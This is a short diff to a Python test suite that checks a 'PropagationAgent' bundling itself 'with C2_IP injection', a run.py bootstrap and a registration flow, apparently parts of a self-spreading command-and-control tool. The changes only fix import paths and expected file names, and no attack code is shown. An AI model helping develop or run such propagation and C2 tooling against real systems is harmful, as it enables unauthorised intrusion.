@@ -20,6 +20,11 @@ import logging
 from pathlib import Path
 from typing import Dict, Any, Optional, Tuple
 
+# Ensure project root is in sys.path
+PROJECT_ROOT = Path(__file__).parent.parent
+if str(PROJECT_ROOT) not in sys.path:
+    sys.path.insert(0, str(PROJECT_ROOT))
+
 # Setup logging
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
 log = logging.getLogger("Test-Propagation-Phase1")
@@ -81,14 +86,13 @@ class Phase1Tester:
         """TEST 3: Create bundle with C2_IP injection"""
         try:
             # Import propagation agent
-            sys.path.insert(0, str(Path(__file__).parent))
             from agents.propagation_agents import PropagationAgent
             
             prop_agent = PropagationAgent()
             bundle_path = prop_agent._prepare_bundle()
             
             # Verify bundle structure
-            required_items = ["agents", "core.py", "requirements.txt", "config.json"]
+            required_items = ["agents", "run.py", "requirements.txt", "config.json"]
             all_present = all((bundle_path / item).exists() for item in required_items)
             
             if all_present:
@@ -142,7 +146,7 @@ class Phase1Tester:
     def test_run_py_exists(self) -> bool:
         """TEST 5: Verify run.py exists and is executable"""
         try:
-            run_py = Path(__file__).parent / "run.py"
+            run_py = PROJECT_ROOT / "run.py"
             
             if not run_py.exists():
                 self.log_test("run.py Bootstrap", False, f"File not found: {run_py}")
@@ -174,7 +178,7 @@ class Phase1Tester:
         """TEST 6: Verify registration flow logic (mock)"""
         try:
             # Read run.py and verify registration flow
-            run_py = Path(__file__).parent / "run.py"
+            run_py = PROJECT_ROOT / "run.py"
             with open(run_py, 'r') as f:
                 content = f.read()
             
